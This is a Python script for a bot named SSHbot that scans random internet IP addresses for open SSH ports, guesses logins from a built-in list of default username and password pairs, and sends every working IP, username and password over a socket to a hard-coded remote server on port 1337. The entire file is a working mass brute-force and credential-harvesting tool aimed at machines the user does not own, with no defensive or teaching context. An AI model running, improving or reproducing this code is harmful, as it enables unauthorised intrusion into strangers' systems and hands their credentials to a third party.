import paramiko
import socket
import random
import time
from colored import Fore, Style
from concurrent.futures import ThreadPoolExecutor

class SSHbot:
    cracked = 0
    
    username_password_list = [
        ('admin', 'admin'),
        ('admin', '123456'),
        ('admin', 'password'),
        ('root', 'root'),
        ('user', 'user'),
        ('guest', 'guest'),
        ('admin', 'admin123'),
        ('root', 'raspberry'),
        ('ubnt', 'ubnt'),
        ('root', 'password'),
        ('user', 'password123'),
        ('root', 'ubuntu'),
        ('root', 'debian'),
    ]

    port = 22
    ip_list = []
    max_threads = 3500
    server_ip = '78.138.130.114'
    server_port = 1337

    def __init__(self):
        self.server_connected = False

    def connect_to_server(self):
        while True:
            try:
                self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_sock.connect((self.server_ip, self.server_port))
                break
            except Exception:
                time.sleep(0.01)

    def send_to_server(self, message):
        if not self.server_connected:
            self.connect_to_server()

        try:
            self.server_sock.sendall(message.encode('utf-8'))
        except Exception:
            self.server_connected = False
            self.connect_to_server()

    def generate_ips(self, count):
        self.ip_list = []
        for _ in range(count):
            ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
            self.ip_list.append(ip)

    def check_port(self, ip, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False

    def ssh_connect(self, ip, user, password, code=0):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(ip, self.port, user, password, banner_timeout=10, allow_agent=False, look_for_keys=False)
        except paramiko.AuthenticationException:
            code = 1
        except paramiko.SSHException:
            return 2
        except socket.error:
            return 3
        finally:
            ssh.close()
        return code

    def run(self):
        while True:
            self.generate_ips(2500)
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                for ip in self.ip_list:
                    executor.submit(self.process_ip, ip)

    def process_ip(self, ip):
        if self.check_port(ip, self.port):
            self.main(ip)

    def main(self, ip):
        found = False
        for user, password in self.username_password_list:
            if found:
                break
            try:
                response = self.ssh_connect(ip, user, password)

                if response == 0:
                    success_message = f'\t{Fore.green}[*] {ip} [*] {user} [*] Pass: {password} => Login Correct *** <={Style.reset}'
                    print(success_message)
                    self.send_to_server(success_message)
                    self.cracked += 1
                    found = True
                    break
                elif response == 1:
                    print(f'\t{Fore.red}[-] {ip} [USER: {user}] [PASSWORD: {password}] => Login Incorrect.{Style.reset}')
                elif response in [2, 3]:
                    found = True
                    break
            except Exception:
                pass

if __name__ == '__main__':
    try:
        s = SSHbot()
        s.connect_to_server()
        s.run()
    except KeyboardInterrupt:
        pass
